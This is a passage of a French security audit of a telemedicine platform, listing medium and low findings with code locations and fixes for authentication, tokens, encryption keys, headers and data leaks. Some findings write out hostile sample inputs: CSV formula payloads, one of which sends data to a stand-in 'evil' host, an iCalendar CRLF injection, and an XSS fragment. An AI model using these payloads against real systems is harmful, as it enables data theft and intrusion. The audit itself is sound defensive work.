- **Localisation** : `backend/messaging/template.py:106-124` (`new_message_notification` : `{{ obj.created_by.name }}`, `{{ obj.consultation.title }}`, `{{ obj.content }}`), `:219-232` (rappels : description libre) ; `consultations/signals.py:91-143` ; `messaging/providers/webpush.py:36-47` ; `patient/src/custom-sw.js:18-28`.
- **Description** : le texte intégral d'un message clinique part chez Twilio (États-Unis), Meta, OVH, Swisscom, Clickatell, SMSMode et s'affiche sur l'écran verrouillé. Effet secondaire : tout participant fait relayer un texte arbitraire (URL de phishing) aux praticiens depuis le sender ID officiel. En mode E2E, `obj.content` est le blob chiffré (notification illisible).
- **Recommandation** : notifications génériques sans contenu (« Nouveau message de … » + lien) ; DPA et transferts hors UE/CH documentés ; option par tenant.

### M-08 — Changement d'identifiant sans vérification : pré-hijack et usurpation par un praticien
- **Localisation** : `backend/users/serializers.py:97-146, 255-268` (`email`, `mobile_phone_number` modifiables via `/api/auth/user/` ; `update` remet `email_verified=False` sans rien exiger) ; `users/views.py:1219-1443` (un praticien modifie tout patient visible) ; `:2223-2313` (code de connexion envoyé au nouvel identifiant) ; `AccountVerifyView` l. 1953-1967 (réclamation d'un compte sans purge des sessions existantes) ; `RegisterSerializer.save` l. 405-411 (renvoie le compte existant).
- **Description** : (a) un utilisateur rattache à son compte un email non encore enregistré en conservant ses JWT ; quand le vrai propriétaire s'inscrit, il « réclame » le compte de l'attaquant, qui continue d'y accéder ; (b) un praticien remplace l'email d'un patient par le sien, demande un code et obtient un JWT au nom du patient.
- **Recommandation** : vérifier par code le nouvel identifiant avant de le lier (« change pending ») ; à la réclamation d'un compte, blacklister tous les tokens et réinitialiser le mot de passe ; interdire le changement d'identifiant d'un patient ayant déjà un `last_login` sans re-vérification.

### M-09 — Contournement de la politique SSO-only (`disable_password_login`)
- **Localisation** : `backend/users/views.py:2223-2313` (`SendVerificationCodeView` sans filtre `is_practitioner`, renvoie `auth_token`), `backend/api/views.py:170-303` (`AnonymousTokenAuthView` sans filtre), `core/views.py:30-42` (`LoginSelectorView.post` n'applique pas le réglage), `/<lang>/admin/login/` natif, `/password_reset/` Django (E-05).
- **Description** : un praticien (ou un ex-employé dont le compte IdP est désactivé mais le compte local encore actif) obtient un JWT avec un simple code email/SMS, sans MFA ni déprovisionnement centralisé.
- **Recommandation** : refuser les praticiens dans ces vues quand `disable_password_login` est vrai ; appliquer le réglage dans `LoginSelectorView.post` ; désactiver `admin:login` ; synchroniser `is_active` avec l'IdP.

### M-10 — Jeton `one_time_auth_token` réutilisable et exposé ; code de connexion sans expiration dans `AnonymousTokenAuthView`
- **Localisation** : `backend/users/models.py:265-270, 420-423` (uuid4 minté par `save()` pour tout `temporary`), `backend/api/views.py:183-201` (chaque usage réécrit `verification_code_created_at = now` : le lien ne périme jamais tant qu'il sert ; `temporary_participant_token_expiry_hours` = 1 par défaut), `:224-283` (pas de contrôle d'âge du code, `verification_attempts` sans `select_for_update`, comparaison `!=` alors que `codes_match` en temps constant existe dans `users/verification.py:29-42`) ; lien `?auth=` en query string (`consultations/views.py:1401`, `messaging/models.py:899`) ; `users/views.py:2284-2292` (`SendVerificationCodeView` régénère le jeton de n'importe quel compte sur requête anonyme : le lien d'invitation reçu devient invalide).
- **Description** : bearer credential complet pour les invités, non à usage unique, en clair en base, visible dans l'admin (E-10), dans l'historique, le `Referer` et les journaux ; un appel anonyme avec l'email d'un patient invité juste avant sa téléconsultation l'empêche de la rejoindre.
- **Recommandation** : expiration absolue et usage unique après échange contre un JWT court ; stockage haché avec `compare_digest` ; transmission en fragment `#` ou par POST ; ne pas régénérer le jeton sur requête anonyme pour les comptes `authenticates_without_code` ; appliquer TTL, `select_for_update` et `codes_match` dans `AnonymousTokenAuthView`.

### M-11 — Cookies JWT et de session sans `Secure`, CSRF non appliqué à l'authentification par cookie, HSTS absent côté Django
- **Localisation** : `backend/core/settings.py:376-386` (`REST_AUTH` sans `JWT_AUTH_SECURE`, `JWT_AUTH_COOKIE_USE_CSRF`, `JWT_AUTH_SAMESITE` ; `SESSION_LOGIN` par défaut `True` → `/api/auth/login/` ouvre aussi une session Django) ; `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, `SECURE_HSTS_SECONDS`, `SECURE_SSL_REDIRECT` absents (défauts Django `False`/`0`) ; HSTS seulement dans `backend/nginx:14`, absent de `debian/nginx` ; `SECURE_PROXY_SSL_HEADER` avec `X-Forwarded-Proto https` forcé par `backend/nginx:35` même en clair.
- **Description** : `_auth` (60 h), `_refresh` (24 h) et `sessionid` (14 j) circulent sans `Secure` ; une requête portant `_auth` sans `Authorization` est authentifiée sans contrôle CSRF (`SameSite=Lax` bloque les POST cross-site, mais pas same-site : si les tenants sont des sous-domaines d'un même domaine, une page d'un tenant forge des requêtes vers un autre, à confirmer selon le DNS).
- **Recommandation** : `JWT_AUTH_SECURE`, `JWT_AUTH_HTTPONLY`, `JWT_AUTH_SAMESITE="Strict"`, `JWT_AUTH_COOKIE_USE_CSRF` (ou suppression des cookies JWT), `SESSION_LOGIN: False`, `SESSION_COOKIE_SECURE`/`CSRF_COOKIE_SECURE`, `SECURE_HSTS_SECONDS` avec `INCLUDE_SUBDOMAINS` quand `DEBUG=False`, session admin plus courte, transmettre `$scheme` réel depuis le proxy TLS.

### M-12 — Énumération de comptes et divulgation du statut « patient »
- **Localisation** : `backend/users/views.py:1694-1721` (`LoginView` : 403 « disabled for patients » / « disabled for practitioners » avant toute vérification de mot de passe), `:1739-1751` (`PasswordResetView` : 403 pour praticien en SSO-only).
- **Description** : `POST /api/auth/login/ {"email": X, "password": "x"}` → 403 révèle que X est un patient du tenant (donnée de santé au sens RGPD).
- **Recommandation** : authentifier d'abord puis renvoyer une erreur générique ; réponse 200 uniforme pour le reset.

### M-13 — Mots de passe d'application DAV en clair, relistables, acceptés pour des comptes désactivés
- **Localisation** : `backend/users/models.py:519-524, 545-548, 550-567` (`token_urlsafe(48)` stocké en clair ; `authenticate` filtre `is_active` de l'app password mais jamais `user__is_active`), `users/serializers.py:538-556` (`token` renvoyé à chaque `GET /api/user/dav-passwords/`), `users/views.py:2394-2402` (création ouverte aux patients), `dav/auth.py:18-31`.
- **Description** : un praticien désactivé garde l'accès CalDAV/CardDAV ; un JWT volé permet de récupérer des identifiants longue durée ; le staff lit tous les jetons (E-10). Entropie 384 bits : force brute impraticable.
- **Recommandation** : `user__is_active=True` (et refuser les `temporary`), hachage, affichage unique à la création, expiration/rotation, purge à la désactivation du compte.

### M-14 — Tokens statiques DRF sans expiration ni périmètre
- **Localisation** : `backend/core/settings.py:125, 292-295`, `users/admin.py:67-79` (`list_display` avec `key`), `dj_rest_auth/views.py:158-161` (le logout API supprime `request.user.auth_token`).
- **Description** : un jeton d'intégration FHIR donne accès à toute l'API au nom du praticien associé, à vie, en clair, visible par tout staff ayant la permission ; il porte donc aussi les failles C-02 et E-14.
- **Recommandation** : comptes d'intégration dédiés sans droits UI, rotation, masquage de `key`, jetons expirants (knox) ou OAuth2 client-credentials, IP allow-list, journalisation.

### M-15 — Fuite de données personnelles entre participants, vers les patients et via les endpoints publics
- **Localisation** : `backend/consultations/serializers.py:128-155` (`ConsultationUserSerializer` : email, téléphone), `:158-170` (`QueueSerializer.users`), `:173-194`, `:353-384` (`group`, `owned_by`, `created_by` imbriqués dans `ConsultationSerializer` servi aux patients, `users/views.py:561-603`) ; `consultations/views.py:1416-1444` (`QueueViewSet` ouvert aux patients) ; `users/views.py:217-228` (`specialities/<id>/doctors` → `UserDetailsSerializer` complet, avec adresse, date de naissance, `last_login`, `app_preferences`, `public_key` et **tous** les custom fields, `_role_custom_fields` l. 169-199) ; `users/serializers.py:558-586` (`PublicPractitionerSerializer` : `email`, `mobile_phone_number`, servi sans authentification quand `public_organisations`) ; `consultations/views.py:1745, 1785` (`ReasonSlotsView` : `user_email`, déduction des créneaux occupés).
- **Description** : un patient voit l'email et le téléphone de chaque participant, des praticiens owner/créateur et de tous les membres de la queue rattachée ; les endpoints publics exposent des coordonnées personnelles (utilisées pour l'OTP) qui alimentent l'énumération, le SMS bombing et le phishing.
- **Recommandation** : serializer minimal (nom, photo, rôle) pour les vues patient ; ne pas imbriquer `group.users` ; `/api/queues/` réservé aux praticiens ; serializer public dédié sans coordonnées personnelles ; `doctors` doit utiliser `PublicPractitionerSerializer`.

### M-16 — Références utilisateur non filtrées par la visibilité configurée
- **Localisation** : `backend/consultations/serializers.py:719-721, 1014-1016` (`participants_ids` = `User.objects.all()`), `:356-384` (`beneficiary_id`, `owned_by_id`, `group_id`), `:1745-1750` + `tasks.py:165-178` (`recipient_id` des rappels : message libre par SMS/email vers tout utilisateur), `:313-350` (`resolve_user` rattache un compte existant par email/téléphone : oracle d'existence), `users/views.py:1352-1385` (`UserViewSet.create` : le « merge » cherche un `temporary` par email/téléphone hors périmètre et réassigne `created_by`), `:560-582` (`initial_keys` en update sans validation d'appartenance), `:1420-1439` (`partial_update` sans la garde « appartient à un groupe » présente dans `update`), `serializers.py:78-88` (`_save_custom_fields` sans vérification de `target_model`).
- **Description** : `PATCH /api/appointments/<id>/ {"participants_ids": [N]}` renvoie les données de N et lui envoie une invitation ; `POST /api/reminders/ {"recipient_id": N, "title": "…"}` envoie un message arbitraire à N ; contournement de `patient_visibility`/`users_visibility` sous `alone`/`organization`.
- **Recommandation** : restreindre ces `PrimaryKeyRelatedField` aux utilisateurs visibles ; scoper la recherche du `temporary` au périmètre du praticien ; aligner `partial_update` sur `update`.

### M-17 — Périmètre d'écriture des consultations trop large ; `forgot-passphrase` sans ré-authentification
- **Localisation** : `backend/consultations/managers.py:19-40` (`accessible_by` inclut les praticiens simplement invités avec la case « visible »), `consultations/views.py:189-212` (write = `accessible_by`), `fhir.py:951-955` (DELETE = clôture), `serializers.py:353-440` (`beneficiary_id`, `owned_by_id`, `group_id`, `notes`, `visible_by_patient`, `is_encrypted`, `public_key` modifiables), `views.py:286-295` (`sync_consultation_keys` écrase les enveloppes d'autrui) ; `users/encryption_views.py:116-131` (`forgot-passphrase` : régénère la paire et retourne la passphrase à tout porteur d'un JWT, sans mot de passe, code, throttle ni notification).
- **Description** : un invité à un seul rendez-vous peut changer bénéficiaire, owner et queue d'une consultation, la fermer, la « supprimer », basculer `is_encrypted=false` ou corrompre les enveloppes des autres membres. Un vol de session (JWT, lien `?auth=`) vaut réinitialisation de clé E2E.
- **Recommandation** : réserver update/destroy/close/reopen et les changements de `beneficiary`/`owned_by`/`group` à owner, créateur et membres de queue ; champs de chiffrement en lecture seule après création ; `sync_consultation_keys` ne créant que les enveloppes manquantes ; ré-authentification, throttle, journal et notification sur `forgot-passphrase`.

### M-18 — Gestion des clés E2E : clé master en clair sur le poste admin, pas de rotation, resync inexistant, messages non authentifiés
- **Localisation** : `backend/encryption_admin/templates/admin/encryption/generate_master.html:128-148` (PKCS#8 non chiffré téléchargé dans Téléchargements), `:90-122` et `settings.html:245-280` (copie IndexedDB `hcw-master-key`) ; `consultations/serializers.py:979-987` (`_revoke_consultation_key` supprime la ligne mais la clé de consultation ne change pas), `consultations/models.py:51-62` (clé de queue partagée sans rotation), `docs/admin/encryption.md:104, 106` (« Resync key banner » et outil de recouvrement master documentés mais inexistants : `encryption_key_lost` n'apparaît que dans les modèles TS) ; `core/encryption.py:65, 133, 150` et `encryption.service.ts` (AES-GCM sans AAD, messages non signés) ; `practitioner/.../encryption.service.ts:97-111` (RSA-2048 pour les consultations vs 4096 côté serveur et documentation) ; aucun throttle ni journal sur les endpoints de clés.
- **Description** : vol du fichier PEM ou XSS sur l'origine admin = déchiffrement de toutes les consultations via `encrypted_private_key_master` ; un participant retiré ou un membre de queue sorti conserve une clé valide pour tout ciphertext ultérieur ; un utilisateur ayant régénéré sa clé perd définitivement les consultations existantes ; le serveur peut injecter des messages attribués à un participant.
- **Recommandation** : PEM protégé par passphrase ou support matériel, purge après usage et TTL IndexedDB ; rotation de la clé de consultation au retrait d'un participant et de la clé de queue au retrait d'un membre ; implémenter réellement le resync et un outil de recouvrement master ; signer les messages et lier les enveloppes par AAD (`consultation_id`, destinataire) ; aligner les tailles de clés (ou passer à X25519 + HKDF) ; throttler et journaliser les endpoints de clés.

### M-19 — Tokens LiveKit trop longs et trop permissifs ; credentials S3 principaux transmis à LiveKit ; TURN statiques
- **Localisation** : `backend/mediaserver/manager/livekit.py:207-227` (`_build_jwt` sans `with_ttl` → 6 h par défaut, `room_admin=bool(user.is_practitioner)`), `:193-205` (`_get_create_room` avec `max_participants=10` jamais appelé), `:394-401` (`S3Upload(access_key=settings.LIVEKIT_S3_ACCESS_KEY, …)` = credentials du bucket des pièces jointes par défaut), `consultations/views.py:1161-1225` et `signals.py:302-317` (expulsion/clôture sans invalidation du JWT), `users/views.py:2021-2066` (`TestRTCView` : tout utilisateur obtient un token `canPublish` pour une room aléatoire, sans limite), `mediaserver/serializers.py:221-251` (credentials TURN statiques envoyés à tous les clients).
- **Description** : un participant retiré ou une consultation clôturée laissent un jeton valable jusqu'à 6 h pour se reconnecter directement au SFU ; `roomAdmin` permet au praticien de contourner les règles métier de modération via l'API LiveKit ; une compromission du serveur média (C-03) livre les clés du bucket.
- **Recommandation** : `with_ttl(timedelta(minutes=10))` (le client redemande `join` à chaque reconnexion), retirer `roomAdmin`, créer la room avec `max_participants`, limiter/throttler `TestRTCView`, identité IAM dédiée `PutObject` sur `recordings/`, TURN en credentials éphémères (HMAC).

### M-20 — Transcription : audio médical envoyé en clair à un serveur whisper sans authentification par défaut
- **Localisation** : `backend/core/settings.py:1680-1681` (`WHISPER_LIVE_URL=ws://127.0.0.1:9090`, `WHISPER_LIVE_API_KEY=""`), `docker-compose.yml`, `backend/consultations/consumers.py:200-228` (`language`/`speaker_label` client non validés), `:159-163` (URL interne renvoyée au navigateur).
- **Recommandation** : refuser `ws://` hors loopback (ou exiger `wss://`), rendre la clé obligatoire quand la transcription est activée, valider `language` (liste) et `speaker_label` (longueur), ne pas renvoyer l'URL au client.

### M-21 — Limites de taille d'upload insuffisantes ou contournables
- **Localisation** : `practitioner/nginx:13`, `patient/nginx:13` (`client_max_body_size 0` = illimité sur le proxy `/api`), `backend/Dockerfile:40` (Daphne exposé sans nginx devant), `backend/nginx:30` (20M mais seulement pour le conteneur admin), `consultations/serializers.py:1353-1364` (contrôle après réception complète, `0` = illimité), `DATA_UPLOAD_MAX_MEMORY_SIZE`/`FILE_UPLOAD_*` absents.
- **Recommandation** : `client_max_body_size` cohérent sur tous les proxies (ex. 25M), contrôle de `Content-Length` avant parsing, `DATA_UPLOAD_MAX_MEMORY_SIZE` explicite.

### M-22 — En-têtes de sécurité HTTP absents ou perdus, `X-Forwarded-Proto/For` non transmis
- **Localisation** : `practitioner/nginx:6-40`, `patient/nginx:6-40`, `debian/nginx:18-83` (aucun `add_header` CSP / `X-Frame-Options` / HSTS / `Referrer-Policy` / `Permissions-Policy` ; seul `Host` transmis ; regex `^/(api|ws)` non ancrée) ; `practitioner/src/index.html`, `patient/src/index.html` (pas de `<meta http-equiv="Content-Security-Policy">`) ; `backend/nginx:10-15` (en-têtes posés au niveau `server` mais **annulés** dans les `location` ayant leur propre `add_header` : `/static/` et toute URI en `.js/.css/.json/.md`), `:12` (`X-XSS-Protection` obsolète), `:13` (`Referrer-Policy same-origin` doublonne celui de Django), `:14` (HSTS sans `includeSubDomains`/`preload`), `:15` (CSP commentée, cf. commit `5710ba75` « Disable Content-Security-Policy »), `server_tokens` non désactivé.
- **Description** : clickjacking des interfaces praticien et patient (« accepter l'appel », « confirmer présence », « clore »), aucune CSP pour freiner une XSS, `request.is_secure()` faux derrière les proxies SPA (URLs `http://` générées par `build_absolute_uri` dans `fhir_server/bundle.py:66`, `references.py:148`, `users/views.py:1608`).
- **Recommandation** : `include` d'en-têtes répété dans chaque `location` avec `always` ; CSP (`angular.json` `"security": {"autoCsp": true}` puis `default-src 'self'; connect-src 'self' wss: <livekit>; img-src 'self' blob: data:; media-src blob:; worker-src 'self' blob:; frame-ancestors 'none'; object-src 'none'; base-uri 'self'`), `X-Frame-Options DENY`, `X-Content-Type-Options nosniff`, `Referrer-Policy strict-origin-when-cross-origin`, `Permissions-Policy` (camera/microphone `self`), HSTS sur le proxy TLS ; `proxy_set_header X-Forwarded-Proto $scheme` et `X-Forwarded-For $remote_addr` (écrasé) ; ancrer `^/(api|ws)(/|$)` ; `server_tokens off`.

### M-23 — Journalisation console en production du contenu médical dans les deux frontends
- **Localisation** : `practitioner/src/app/core/services/websocket.service.ts:154` (`console.log('[WS] Received message:', message)` sur tout événement : messages de chat, transcription, notifications), `user-websocket.service.ts:259, 267, 279`, `notification.service.ts:112, 135` ; 64 appels `console.*` dans `practitioner/src/app` ; `patient/src/app/core/services/websocket.service.ts:145`, `user-websocket.service.ts:251, 262`, `video-consultation.page.ts:275, 285`, `livekit.service.ts:442` (visible dans logcat sur Android).
- **Recommandation** : passer par `LoggerService` (Warn/Error en prod), ne jamais logger les payloads, supprimer `console.log`/`debug` au build.

### M-24 — Redis sans authentification ni TLS, persistance en clair ; aucune procédure de sauvegarde ni chiffrement au repos documentés
- **Localisation** : `backend/core/settings.py:454, 471-488, 540-554`, `core/healthcheck.py:32-36` (aucun paramètre mot de passe/TLS possible) ; `docker-compose.yml:331-345` (`redis:7` par défaut, snapshots RDB dans `./data/redis_data`), `:281` (`./data/postgres_data`) ; `docs/deployment/docker-compose.md:143-157`.
- **Description** : cache, channel layer (événements de chat) et arguments Celery sont écrits en clair sur disque ; tout conteneur compromis du réseau Compose (dont les nginx) accède à Redis et PostgreSQL.
- **Recommandation** : `REDIS_URL`/`REDIS_PASSWORD` (+ TLS), `requirepass`, `--save ""` si la persistance n'est pas requise, chiffrement disque, sauvegarde chiffrée testée, réseaux Compose segmentés.

### M-25 — Image Docker backend : pas de `.dockerignore`, base non épinglée, pip sans hash, services de données en root
- **Localisation** : `backend/Dockerfile:13, 27` (`COPY . /app/`), aucun `.dockerignore` dans `backend/`, `practitioner/`, `patient/` ; présents localement : `backend/.env`, `backend/uploads/` (pièces jointes), `celerybeat-schedule` ; `:2, 16` (`python:3.13` sans digest), `:10-12` (pip sans `--require-hashes`) ; `docker-compose.yml:95, 295` (`latest`) ; `db`/`redis`/`livekit` sans `user`, `cap_drop`, `no-new-privileges`.
- **Description** : une image construite depuis un poste de développement peut embarquer des secrets et des pièces jointes réelles.
- **Recommandation** : `.dockerignore` (`.env*`, `uploads`, `venv`, `__pycache__`, `celerybeat-*`, `.claude`, `.git`), image `python:3.13-slim@sha256:…`, `pip-compile --generate-hashes`, tags épinglés, durcissement des services, scan d'image (trivy).

### M-26 — `/api/health/` non authentifié, sur tout hôte, divulguant les exceptions internes
- **Localisation** : `backend/core/healthcheck.py:17-47` (`checks["database"] = str(e)`, `checks["redis"] = str(e)` ; connexion Redis neuve à chaque appel), middleware placé avant `TenantMainMiddleware` et `SecurityMiddleware`.
- **Recommandation** : réponse binaire, détails en logs, restriction par IP ou jeton, client cache réutilisé, `Cache-Control: no-store`.

### M-27 — CI : jeton non restreint, actions non épinglées, aucun scanner ni `check --deploy`
- **Localisation** : `.github/workflows/tests.yml` (pas de `permissions:`, `actions/*@v4`/`@v5` par tag, `pip install` sans hash) ; pas de `dependabot.yml`, `SECURITY.md`, CodeQL ; aucun `bandit`/`semgrep`/`trivy`/`pip-audit` ; 3 fichiers de tests seulement touchent aux permissions, aucun sur throttling, CSRF, CORS, cross-tenant.
- **Recommandation** : `permissions: contents: read`, épinglage par SHA, jobs `pip-audit`, `yarn audit`, `bandit`, `trivy`, `manage.py check --deploy` avec `DEBUG=False`, Dependabot/Renovate, `SECURITY.md`.

### M-28 — Unités systemd sans durcissement
- **Localisation** : `debian/service`, `debian/hcw-celery.service`, `debian/hcw-scheduler.service` (seulement `User=hcw` ; description erronée « Alephium Dashboard » ; `migrate` à chaque démarrage).
- **Recommandation** : `NoNewPrivileges`, `ProtectSystem=strict`, `ProtectHome`, `PrivateTmp`, `PrivateDevices`, `RestrictAddressFamilies`, `CapabilityBoundingSet=`, `ReadWritePaths=/var/lib/hcw`, `EnvironmentFile` en 0640.

### M-29 — Tout staff avec des permissions `view_*` accède à l'intégralité des données de santé dans l'admin
- **Localisation** : `backend/consultations/admin.py:229-233` (`MessageInline` : `content`, `attachment`), `:255-281` (`notes` cliniques), `:344-395` (`MessageAdmin`, `content` en `list_display`), `:398-407` (`Request.comment`), `admin.site.register(Participant/Reminder)` `:56-57` ; `users/admin.py:620-624` (`HealthMetricAdmin`), `:193-211` ; `messaging/admin.py:110-127`.
- **Recommandation** : retirer `Consultation`/`Message`/`Request`/`Participant`/`Reminder`/`HealthMetric` de l'admin (ou lecture seule superuser avec justification tracée), masquer `content`/`notes`, réserver l'admin aux objets de configuration.

### M-30 — Injection de formules CSV/XLSX à l'export
- **Localisation** : `IMPORT_EXPORT_ESCAPE_FORMULAE_ON_EXPORT` non défini (défaut `False`, `import_export/formats/base_formats.py:97`) ; champs contrôlés par les utilisateurs (`first_name`, `last_name`, `city`, `job_title`).
- **Description** : un patient s'inscrit avec `=HYPERLINK("http://evil/?"&A1)` ou `=cmd|'/C calc'!A0` en prénom ; l'admin ouvre l'export XLSX.
- **Recommandation** : `IMPORT_EXPORT_ESCAPE_FORMULAE_ON_EXPORT = True` et `IMPORT_EXPORT_ESCAPE_ILLEGAL_CHARS_ON_EXPORT = True`.

### M-31 — Éditeur d'overrides de traduction accessible à tout staff
- **Localisation** : `backend/translations/admin.py:17-25, 30-42, 83-117` (`admin_view` seulement, aucun `has_change_permission`), menu réservé aux superusers dans `core/settings.py:878-880`, API publique `translations/views.py:8-15`.
- **Description** : tout staff réécrit n'importe quel libellé des deux applications (instructions d'hameçonnage dans l'écran de connexion). XSS non constaté : ngx-translate écrit en `textContent` et aucun `[innerHTML]` n'est lié à `translate`.
- **Recommandation** : contrôler `translations.change_translationoverride` (ou superuser), journaliser.

### M-32 — Consentements non probants (CGU) et absents (enregistrement, transcription)
- **Localisation** : `backend/users/models.py:34-55` (`Term` sans version ni date, contenu modifiable en place), `:225-227` (`accepted_term` FK sans horodatage), `users/serializers.py:121` (champ écrivable par le client) ; `consultations/views.py:882-947`, `consumers.py:114-137, 470-502` (voir E-17).
- **Recommandation** : `TermAcceptance(user, term, version, accepted_at, ip/ua)` immuable, CGU versionnées et gelées une fois publiées ; consentement horodaté par participant avant enregistrement/transcription.

### M-33 — Paramètres Constance sans validation : URLs de base (phishing des liens `?auth=`), `nominatim_url` et `Server.url` (SSRF admin)
- **Localisation** : `backend/core/settings.py:922-936` (`patient_base_url`, `practitioner_base_url`, `backend_base_url`, aucun validateur `https`), utilisées dans `messaging/models.py:874-878` ; `:1064-1075` (`nominatim_url`) → `users/tasks.py:45-54, 146-151` (aucune validation de schéma/hôte, `lat`/`lon` stockés) ; `mediaserver/manager/mediasoup.py:36-44, 61-72` (`Server.url`, payload de `test_connection` renvoyé) ; permission `constance.change_config` pour tout staff qui la détient.
- **Description** : un admin compromis pointe `patient_base_url` vers un domaine sosie : tous les SMS et emails livrent `?auth=<token>` à l'attaquant ; sondage du réseau interne via les URLs configurables.
- **Recommandation** : validateurs (`https://`, domaines autorisés, refus des IP privées), alerte et journal sur changement, permission Constance réservée aux superusers.

### M-34 — Injection iCalendar/vCard et paramètres de lien non encodés
- **Localisation** : `backend/caldav/views.py:76, 79, 83, 89-95` (`SUMMARY`, `DESCRIPTION`, `ORGANIZER;CN=`, `ATTENDEE;CN=` sans échappement RFC 5545), `backend/carddav/views.py:34-66` (FN/N/ADR/ORG), `messaging/models.py:1140-1147, 1174` + `messaging/templates/messaging/appointment.ics:11-14` (titre et description insérés bruts, `\n` → nouvelle propriété), `messaging/models.py:896-904` (`?email={email}` et `additionnal_link_args` concaténés sans `urlencode`) ; `caldav/views.py:111-159` (`_parse_vcalendar` ne déplie pas les lignes, `SUMMARY` > 255 ou `DTSTART` mal formé → 500).
- **Description** : un patient met `last_name = "Doe\r\nATTACH:https://evil.tld/x"` ; à la synchronisation suivante, l'événement dans le calendrier du praticien contient la propriété injectée ; `CN=Doe;RSVP=TRUE:mailto:evil` manipule les paramètres ATTENDEE ; liens cassés pour les emails contenant `+`/`&`.
- **Recommandation** : échappement RFC 5545/6350 (`\\`, `;`, `,`, `\n`) et quotation des paramètres ou bibliothèque `icalendar`/`vobject` ; suppression de CR/LF à l'entrée ; `urllib.parse.urlencode`.

### M-35 — FHIR : références résolues sans contrôle de type ni de périmètre, narrative XHTML non échappée, erreurs 500 oracles
- **Localisation** : `backend/consultations/fhir.py:444-458` (`_resolve_participant_user` : type de ressource ignoré, tout utilisateur actif ou non), `:875-884` (`Encounter.subject` → tout patient du tenant devient bénéficiaire), `:1162-1175` (`MedicationRequest.requester` → `created_by` réassigné = falsification du prescripteur ; non routé aujourd'hui), `:827-831, 890-892` (`text.div` construit par f-string et stocké brut dans `title`) ; `fhir_participants.py:45-52, 67-72` (`get_or_create_by_email` renvoie aussi un praticien ; message 422 renvoyant l'email) ; `fhir_server/mixins.py:136, 150-161, 175` (IntegrityError → 500 ; `PUT/DELETE` sans `identifier` → AssertionError).
- **Description** : `POST /api/fhir/Appointment` avec `participant[].actor.reference = "Patient/<pk>"` en itérant les pk énumère les profils (email, téléphone, date de naissance, adresse dans la ressource `contained`) et envoie des invitations ; titre `<img src=x onerror=…>` renvoyé tel quel dans `text.div` (XSS chez OzoneHIS/OpenMRS) ; 201 vs 500 révèle l'existence d'un email.
- **Recommandation** : vérifier `resource_type` ↔ `is_practitioner`, restreindre aux utilisateurs visibles et actifs, retirer le « requester override », `html.escape` de la narrative, IntegrityError → OperationOutcome 409/422, 400 sans pk ni identifier.

### M-36 — Application patient : secrets en clair sur l'appareil, sauvegarde Android autorisée, contenu médical dans les push, navigation depuis le payload push
- **Localisation** : `patient/src/app/core/services/auth.service.ts:50-52, 134-136` (access/refresh dans Ionic Storage = IndexedDB non chiffré), `deeplink.service.ts:63, 120, 277` (`localStorage`), `encryption-storage.service.ts:3-27, 100` (clé privée E2E en IndexedDB) ; `patient/android/app/src/main/AndroidManifest.xml:4` (`android:allowBackup="true"`, aucun `dataExtractionRules`) ; `patient/src/custom-sw.js:18-28, 32-54` et `practitioner/public/custom-sw.js:34-52` (`client.navigate(accessLink)`/`clients.openWindow(accessLink)` sans vérification `same-origin`) ; `messaging/template.py:110-118` (corps du message dans la notification).
- **Description** : appareil perdu, rooté ou restauration de sauvegarde cloud sur un autre appareil = reprise de session et déchiffrement sans passphrase ; texte médical sur l'écran verrouillé ; une compromission du backend ou de la clé VAPID redirige vers un site de phishing depuis une notification « HCW@Home ».
- **Recommandation** : `allowBackup="false"` ou règles d'exclusion, jetons dans Keystore/Keychain (plugin de coffre sécurisé), purge de la clé E2E au logout, corps générique pour le canal push, vérification `new URL(accessLink, self.location.origin).origin === self.location.origin`.

### M-37 — Minimisation : visibilité « tous les patients » par défaut, données superflues renvoyées aux praticiens, comptes RPPS importés actifs
- **Localisation** : `backend/core/settings.py:1025-1031` (`patient_visibility = "all"`), `users/views.py:1293-1300` ; `users/serializers.py:98-133` (`UserDetailsSerializer` renvoie `last_login`, `app_preferences`, clés publiques, `accepted_term`, date de naissance à tout praticien) ; `users/management/commands/import_rpps.py:1025-1060` (comptes praticiens actifs créés depuis data.gouv avec email de structure partagé, éligibles au login par code par email, à confirmer).
- **Recommandation** : `patient_visibility = "organization"` par défaut ; serializers par usage ; comptes importés `is_active=False` jusqu'à revendication.

---

## 6. Constats de sévérité faible

| ID | Constat | Localisation | Recommandation |
|---|---|---|---|
| F-01 | Tout utilisateur authentifié peut pousser un `user_message` à n'importe quel `target_user_id` du tenant ; aucune limite de débit ni de taille sur les WebSockets | `backend/users/consumers.py:231-260` ; Daphne `websocket_timeout` 86400 s | Restreindre la cible aux relations légitimes ; throttle applicatif WS et plafond de taille |
| F-02 | `broadcast_group` diffuse le statut en ligne de tous les utilisateurs à tout connecté, patients inclus (énumération des ids) | `backend/users/consumers.py:141-149, 344-355` | Restreindre la présence au périmètre pertinent |
| F-03 | Redirecteur `/r/<token>` sans expiration ni limitation ; `?auth=<token>` exposé dans l'en-tête `Location` ; oracle 200/403 | `backend/messaging/views.py:47-54, 101-111`, `messaging/models.py:912-934` (`token_urlsafe(12)`, jamais expiré) | Expiration du `link_token`, 404 uniforme, `ratelimit`, `Cache-Control: no-store` |
| F-04 | Pièces jointes servies `inline` avec content-type deviné depuis l'extension (atténué : auth par en-tête uniquement, SPA en `blob:`, `nosniff`) | `backend/users/views.py:788-800` | `Content-Disposition: attachment` et `application/octet-stream` hors images sûres |
| F-05 | Messages d'erreur internes renvoyés au client (`{"error": str(e)}` : endpoint et bucket S3, erreurs LiveKit) ; `mode` d'enregistrement non validé | `backend/consultations/views.py:886, 916, 946-949, 1003-1006, 1081-1084, 1955-1959` | Messages génériques + log serveur ; valider contre `RecordingModeChoices` |
| F-06 | Sous `DEBUG`, avatars, logos et icônes lisibles par chemin devinable ; en production avec stockage local, aucune `location /upload/` : liens morts ; clés d'enregistrement sans préfixe tenant | `backend/core/urls.py:59-70, 87-92` ; `mediaserver/manager/livekit.py:405` | Servir les médias publics via une vue ou nginx dédié ; préfixer les enregistrements par le schéma |
| F-07 | Rate limiting DAV : un compteur par méthode HTTP (60/min × 6) et basé sur XFF (E-01) | `backend/core/throttling.py:166-197`, `dav/views.py:35-38, 78-81`, `caldav/views.py:218-221`, `carddav/views.py:117-120` | Un seul seau par IP toutes méthodes confondues |
